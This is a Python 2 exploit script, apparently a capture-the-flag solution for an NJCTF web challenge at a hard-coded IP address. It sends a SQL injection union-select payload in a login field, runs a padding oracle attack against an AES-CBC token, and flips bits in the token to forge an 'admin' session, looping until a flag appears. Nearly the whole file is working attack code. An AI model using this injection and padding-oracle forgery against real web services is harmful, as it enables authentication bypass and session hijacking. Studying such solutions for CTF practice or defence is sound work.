#coding:utf-8
import requests
import base64
import time
import urllib

url='http://218.2.197.235:23737/'
N=16

def send_payload(password):
    param={'username':"' union select 'kira','{password}".format(password=password),'password':''}
    result=requests.post(url,data=param)
    #print result.content
    return result

def inject_token(x):
    header={"Cookie":"PHPSESSID="+phpsession+";token="+urllib.quote(x)}
    print header
    result=requests.post(url,headers=header)
    return result

def xor(a, b):
    return "".join([chr(ord(a[i])^ord(b[i%len(b)])) for i in xrange(len(a))])

def pad(string,N):
    l=len(string)
    if l!=N:
        return string+chr(N-l)*(N-l)

def padding_oracle(N,cipher):
    get=""
    for i in xrange(1,N+1):
        for j in xrange(0,256):
            padding=xor(get,chr(i)*(i-1))
            c=chr(0)*(16-i)+chr(j)+padding+cipher
            print c.encode('hex')
            result=send_payload(base64.b64encode(chr(0)*16+c))
            if "ctfer" not in result.content:  #成功登陆就是证明padding oracle错误
                get=chr(j^i)+get
                time.sleep(0.1)
                break
    return get

while 1:
    session=send_payload("kira").headers['set-cookie'].split(',') #获取ID 和 token
    print session
    phpsession=session[0].split(";")[0][10:]
    print phpsession
    ID2=session[1][4:]
    ID=base64.b64decode(urllib.unquote(session[1][4:]))
    print ID2,ID.encode('base64')
    token=base64.b64decode(urllib.unquote(session[2][7:]))
    print token.encode('base64')

    # imtermediary=""
    # imtermediary=padding_oracle(N,ID)
    # print "ID:"+ID.encode('base64')
    # print "token:"+token.encode('base64')
    # print "imtermediary:"+imtermediary.encode('base64')
    # print "\n"

    # if(len(imtermediary)==16):
    #     #plaintext = 'T3JEaW5hcnlVNWVSBAQEBA=='.decode('base64')
    #     plaintext=xor(imtermediary,token);
    #     print "ptxt:",plaintext.encode('base64') #T3JEaW5hcnlVNWVSBAQEBA==
    #     des=pad('admin',N)
    #     tmp=""
    #     for i in xrange(16):
    #         tmp+=chr(ord(token[i])^ord(plaintext[i])^ord(des[i]))

    #     result=inject_token(base64.b64encode(tmp))
    #     print result.content
    #     if "flag" in result.content or "NJCTF" in result.content or 'njctf' in result.content:
    #         input("success")

    plaintext = 'T3JEaW5hcnlVNWVSBAQEBA=='.decode('base64')
    #plaintext=xor(imtermediary,token);
    print "ptxt:",plaintext #T3JEaW5hcnlVNWVSBAQEBA==
    des=pad('admin',N)
    tmp=""
    for i in xrange(16):
        tmp+=chr(ord(token[i])^ord(plaintext[i])^ord(des[i]))
    
    for i in range(256):
        tmp = chr(i)+tmp[1:]
        result=inject_token(base64.b64encode(tmp))
        #print result.content
        if "flag" in result.content or "NJCTF" in result.content or 'njctf' in result.content:
            input("success")
